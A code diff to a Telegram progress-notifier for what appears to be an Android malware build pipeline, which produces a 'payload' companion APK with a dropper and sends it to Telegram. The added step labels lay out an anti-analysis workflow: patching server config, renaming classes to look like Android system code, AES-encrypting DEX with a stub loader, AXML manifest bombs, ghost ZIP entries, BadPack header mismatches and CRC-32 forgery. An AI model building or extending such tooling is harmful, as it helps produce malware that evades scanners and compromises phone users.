@@ -60,13 +60,21 @@ BUILD_STEPS_FULL = [
     ("Send to Telegram",      "[✅]  📤 Send APK to Telegram"),
 ]
 
-# ── Companion-only build steps (payload only, no Nova/dropper) ────────────────
+# ── Companion-only build steps — 8 phases (matches real execution order) ──────
+# Real execution order in build_module.py main():
+#   Phase 4: PHASE_1 steps 1–6   → decompile + patch smali
+#   Phase 5: PHASE_6 + PHASE_1 steps 7/10/9A → obfuscate + assemble
+#   Phase 6: PHASE_2 + SIGNING   → anti-analysis + re-sign
+#   Phase 7: PHASE_3 + POST_RESIGN → encrypt DEX + sign + harden
 BUILD_STEPS_COMPANION = [
-    ("Checkout",              "[1/4] 📥 Checkout & setup"),
-    ("Install tools",         "[2/4] 🔧 Install build tools"),
-    ("Generate package name", "[3/4] 🎲 Generate package name"),
-    ("Build companion APK",   "[4/4] 🔨 Build companion APK (payload)"),
-    ("Send to Telegram",      "[✅]  📤 Send APK to Telegram"),
+    ("Checkout",                "[1/8] 📥 Checkout & setup"),
+    ("Install tools",           "[2/8] 🔧 Install build tools"),
+    ("Generate package name",   "[3/8] 🎲 Generate package name"),
+    ("Decompile & patch smali", "[4/8] 🔨 Decompile & patch smali"),
+    ("Obfuscate & assemble APK","[5/8] 🔀 Obfuscate & assemble APK"),
+    ("Encrypt DEX & resources", "[6/8] 🔐 Encrypt DEX & resources"),
+    ("Sign & harden APK",       "[7/8] ✍️  Sign & harden APK"),
+    ("Send to Telegram",        "[8/8] 📤 Send APK to Telegram"),
 ]
 
 # ── Average step durations in seconds (for ETA) ──────────────────────────────
@@ -85,11 +93,72 @@ STEP_DURATIONS_FULL = {
 }
 
 STEP_DURATIONS_COMPANION = {
-    "Checkout":              15,
-    "Install tools":         60,
-    "Generate package name": 10,
-    "Build companion APK":   90,
-    "Send to Telegram":      10,
+    "Checkout":                 15,
+    "Install tools":            60,
+    "Generate package name":    10,
+    "Decompile & patch smali": 60,
+    "Obfuscate & assemble APK": 90,
+    "Encrypt DEX & resources":  75,
+    "Sign & harden APK":        45,
+    "Send to Telegram":         10,
+}
+
+# ── Sub-step labels shown under the active phase (↳ line) ────────────────────
+# Maps PHASE/STEP_ID → (phase_key, sub_step_label)
+# phase_key must match a key in BUILD_STEPS_COMPANION
+COMPANION_SUB_STEPS = {
+    # Phase 4: Decompile & patch smali
+    "PHASE_1/STEP_1":    ("Decompile & patch smali", "Generate package name"),
+    "PHASE_1/STEP_1B":   ("Decompile & patch smali", "Update StringPool"),
+    "PHASE_1/STEP_2":    ("Decompile & patch smali", "Verify companion APK"),
+    "PHASE_1/STEP_3":    ("Decompile & patch smali", "Extract APK metadata"),
+    "PHASE_1/STEP_4":    ("Decompile & patch smali", "Randomize resource filenames"),
+    "PHASE_1/STEP_5":    ("Decompile & patch smali", "Decompile APK → smali"),
+    "PHASE_1/STEP_5B":   ("Decompile & patch smali", "Patch server config"),
+    "PHASE_1/STEP_5C":   ("Decompile & patch smali", "Patch dropper uninstall target"),
+    "PHASE_1/STEP_5D":   ("Decompile & patch smali", "Patch onResume loop fix"),
+    "PHASE_1/STEP_6":    ("Decompile & patch smali", "Rename smali class paths"),
+    # Phase 5: Obfuscate & assemble APK
+    "PHASE_6/STEP_6A":   ("Obfuscate & assemble APK", "Rename classes → Android names"),
+    "PHASE_6/STEP_6B":   ("Obfuscate & assemble APK", "Inject crash reporter"),
+    "PHASE_1/STEP_7":    ("Obfuscate & assemble APK", "Patch home launcher check"),
+    "PHASE_6/STEP_6C":   ("Obfuscate & assemble APK", "Replace bad string literals"),
+    "PHASE_6/STEP_6D":   ("Obfuscate & assemble APK", "Rename custom methods"),
+    "PHASE_6/STEP_6E":   ("Obfuscate & assemble APK", "Rename socket package"),
+    "PHASE_1/STEP_10":   ("Obfuscate & assemble APK", "Patch manifest + assemble APK"),
+    "PHASE_1/STEP_9A":   ("Obfuscate & assemble APK", "Patch versionCode + versionName"),
+    "PHASE_1/STEP_12_FINGERPRINT": ("Obfuscate & assemble APK", "Generate per-build fingerprint"),
+    "PHASE_1/STEP_13_SIGN":        ("Obfuscate & assemble APK", "Sign companion APK"),
+    "PHASE_1/STEP_14_ASSET":       ("Obfuscate & assemble APK", "Replace companion.apk in assets"),
+    "PHASE_1/STEP_15_KOTLIN":      ("Obfuscate & assemble APK", "Inject package name into Kotlin"),
+    # Phase 6: Encrypt DEX & resources
+    "PHASE_2/STEP_17H":            ("Encrypt DEX & resources", "Inject fake string resources"),
+    "PHASE_2/STEP_17_MANIFEST":    ("Encrypt DEX & resources", "Inject fake manifest entries"),
+    "PHASE_2/STEP_11_ZIPALIGN":    ("Encrypt DEX & resources", "Zipalign APK"),
+    "PHASE_2/STEP_AXML_0200":      ("Encrypt DEX & resources", "Inject unknown AXML chunk"),
+    "PHASE_2/STEP_REPAIR_RESMAP":  ("Encrypt DEX & resources", "Validate + repair resource map"),
+    "PHASE_2/STEP_AXML_PATCHER":   ("Encrypt DEX & resources", "AXML manifest bomb"),
+    "PHASE_2/STEP_ZIP_ENHANCER":   ("Encrypt DEX & resources", "Ghost ZIP entries injection"),
+    "PHASE_2/STEP_FAKE_META_INF":  ("Encrypt DEX & resources", "Inject fake META-INF entries"),
+    "SIGNING/STEP_RESIGN_1":       ("Encrypt DEX & resources", "Re-sign after anti-analysis"),
+    "PHASE_1/STEP_14_ASSET_2":     ("Encrypt DEX & resources", "Replace companion.apk after re-sign"),
+    "PHASE_3/STEP_DEX_REBUILD_FULL":("Encrypt DEX & resources", "Rebuild full DEX"),
+    "PHASE_3/STEP_DEX_ENCRYPT":    ("Encrypt DEX & resources", "Encrypt DEX → AES-256-CBC"),
+    "PHASE_3/STEP_STUB_SMALI":     ("Encrypt DEX & resources", "Write stub smali classes"),
+    "PHASE_3/STEP_SMALI_PRUNE":    ("Encrypt DEX & resources", "Prune smali → stub only"),
+    "PHASE_3/STEP_APKTOOL_YML":    ("Encrypt DEX & resources", "Write fresh apktool.yml"),
+    "PHASE_3/STEP_DEX_REBUILD":    ("Encrypt DEX & resources", "Rebuild stub DEX"),
+    "PHASE_3/STEP_DEX_INJECT":     ("Encrypt DEX & resources", "Inject stub DEX into APK"),
+    "PHASE_3/STEP_RES_ENCRYPT":    ("Encrypt DEX & resources", "Encrypt resources → AES-256-CBC"),
+    "PHASE_3/STEP_STUB_ARSC":      ("Encrypt DEX & resources", "Replace ARSC with stub"),
+    # Phase 7: Sign & harden APK
+    "SIGNING/STEP_RESIGN_PHASE3":        ("Sign & harden APK", "Re-sign after DEX encryption"),
+    "PHASE_1/STEP_14_ASSET_PHASE3":      ("Sign & harden APK", "Replace companion.apk final"),
+    "POST_RESIGN/STEP_TIMESTAMP_RAND":   ("Sign & harden APK", "Randomize ZIP timestamps"),
+    "POST_RESIGN/STEP_BADPACK_GP":       ("Sign & harden APK", "BadPack LFH mismatch injection"),
+    "POST_RESIGN/STEP_17C":              ("Sign & harden APK", "APK size randomization"),
+    "POST_RESIGN/STEP_TYPE2032":         ("Sign & harden APK", "Non-standard compression injection"),
+    "POST_RESIGN/STEP_CRC32_FORGE":      ("Sign & harden APK", "CRC-32 forgery — final step"),
 }
 
 # ── Template display names + emoji ───────────────────────────────────────────
@@ -406,6 +475,65 @@ def resolve_chat_id(chat_id_arg: str) -> str:
     return ""
 
 
+def build_sub_step_message(phase_key: str, sub_label: str,
+                           build_num: str, pkg: str, elapsed: int) -> str:
+    """Build full 8-phase companion progress message with ↳ sub-step detail.
+
+    Called from build_module.py via --sub-step mode.
+    Shows all 8 phases with ✅/⏳/⬜ and a ↳ line under the active phase.
+    """
+    steps    = BUILD_STEPS_COMPANION
+    step_keys = [k for k, _ in steps]
+    now = datetime.now(timezone.utc).strftime("%H:%M:%S UTC")
+
+    # Calculate percent based on active phase index
+    active_idx = step_keys.index(phase_key) if phase_key in step_keys else 0
+    pct = round(active_idx / len(step_keys) * 100)
+    bar = _progress_bar(pct)
+
+    # ETA from durations
+    remaining = 0
+    found = False
+    for key, _ in steps:
+        if key == phase_key:
+            found = True
+            remaining += max(0, STEP_DURATIONS_COMPANION.get(key, 10) // 2)
+            continue
+        if found:
+            remaining += STEP_DURATIONS_COMPANION.get(key, 10)
+    eta = f"~{format_elapsed(remaining)}" if remaining > 0 else "~0s"
+
+    lines = [
+        "🔨 <b>Building: 🔧 Companion App</b>",
+        "━━━━━━━━━━━━━━━━━━━━",
+        f"🔢 Build   : #{build_num}",
+    ]
+    if pkg:
+        lines.append(f"📦 Package : <code>{pkg}</code>")
+    lines.append("━━━━━━━━━━━━━━━━━━━━")
+
+    current_found = False
+    for key, label in steps:
+        if key == phase_key:
+            lines.append(f"⏳ <b>{label}…</b>")
+            if sub_label:
+                lines.append(f"   ↳ {sub_label}")
+            current_found = True
+        elif not current_found:
+            lines.append(f"✅ {label}")
+        else:
+            lines.append(f"⬜ {label}")
+
+    lines += [
+        "━━━━━━━━━━━━━━━━━━━━",
+        f"📊 {bar}",
+        f"⏱ Elapsed : {format_elapsed(elapsed)}",
+        f"⏰ ETA     : {eta}",
+        f"🕐 Time    : {now}",
+    ]
+    return "\n".join(lines)
+
+
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument("--step",        required=True)
@@ -423,7 +551,51 @@ def main():
     parser.add_argument("--elapsed",     default="0", type=int)
     parser.add_argument("--build-type",  default="full", dest="build_type",
                         choices=["full", "companion_only"])
+    # ── sub-step mode: called from build_module.py for per-phase updates ──────
+    # Usage:
+    #   python3 telegram_notify.py \
+    #       --sub-step       "Decompile APK → smali"   # human-readable sub label
+    #       --sub-step-phase "Decompile & patch smali"  # must match BUILD_STEPS_COMPANION key
+    # All other args (token, chat-id, msg-id, build) read from env vars.
+    parser.add_argument("--sub-step",         default="", dest="sub_step")
+    parser.add_argument("--sub-step-phase",   default="", dest="sub_step_phase")
     args = parser.parse_args()
+
+    # ── sub-step mode ─────────────────────────────────────────────────────────
+    if args.sub_step:
+        _token   = resolve_token(getattr(args, "token", "") or "")
+        _chat_id = resolve_chat_id(getattr(args, "chat_id", "") or "")
+        _msg_id  = (getattr(args, "msg_id", "") or
+                    os.environ.get("BUILD_MESSAGE_ID", "") or "0")
+        _build   = (getattr(args, "build", "") or
+                    os.environ.get("GITHUB_RUN_NUMBER", "0"))
+        _pkg     = getattr(args, "pkg", "") or ""
+
+        if not _token or not _chat_id or _msg_id in ("0", ""):
+            print("[telegram_notify] sub-step: missing credentials — skipping",
+                  file=sys.stderr)
+            sys.exit(0)
+
+        _start_ts = os.environ.get("BUILD_START_TS", "")
+        _elapsed  = 0
+        if _start_ts:
+            try:
+                _elapsed = int(time.time()) - int(_start_ts)
+            except Exception:
+                pass
+
+        _phase_key = args.sub_step_phase or "Decompile & patch smali"
+
+        _text = build_sub_step_message(
+            phase_key=_phase_key,
+            sub_label=args.sub_step,
+            build_num=_build,
+            pkg=_pkg,
+            elapsed=_elapsed,
+        )
+        edit_message(_token, _chat_id, _msg_id, _text)
+        print(f"[telegram_notify] sub-step: [{_phase_key}] ↳ {args.sub_step}")
+        sys.exit(0)
 
     resolved_token   = resolve_token(args.token)
     resolved_chat_id = resolve_chat_id(args.chat_id)
